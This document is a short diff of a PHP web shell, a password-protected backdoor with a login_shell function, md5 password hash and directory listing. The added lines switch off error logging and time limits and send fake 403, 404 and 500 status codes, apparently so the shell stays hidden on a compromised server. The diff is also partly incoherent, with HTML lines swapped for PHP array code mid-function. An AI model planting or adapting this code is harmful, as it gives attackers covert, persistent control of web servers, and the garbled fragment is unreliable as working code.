@@ -1,14 +1,17 @@
-<?php
-session_start();
-@set_time_limit(0);
-@clearstatcache();
-@ini_set('error_log', NULL);
-@ini_set('log_errors', 0);
-@ini_set('max_execution_time', 0);
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-
-
+<?php 
+ 
+@ini_set('error_log', NULL); 
+@ini_set('log_errors', 0); 
+@ini_set('max_execution_time', 0); 
+@error_reporting(0); 
+@set_time_limit(0); 
+@ob_clean(); 
+@header("X-Accel-Buffering: no"); 
+@header("Content-Encoding: none"); 
+@http_response_code(403); 
+@http_response_code(404); 
+@http_response_code(500); 
+ 
 /* Configuration */
 /* Password using md5 hashes */
 $password = "e5f45a0a383440b5dcf789715c5c1ddd"; 
@@ -19,8 +22,9 @@ date_default_timezone_set("Asia/Jakarta");
 function login_shell()
 {
 ?>
-    <!DOCTYPE html>
-    <html lang="en">
+ 
+    $folders = []; 
+    $files = []; 
  
     try { 
         $items = @scandir($path); 
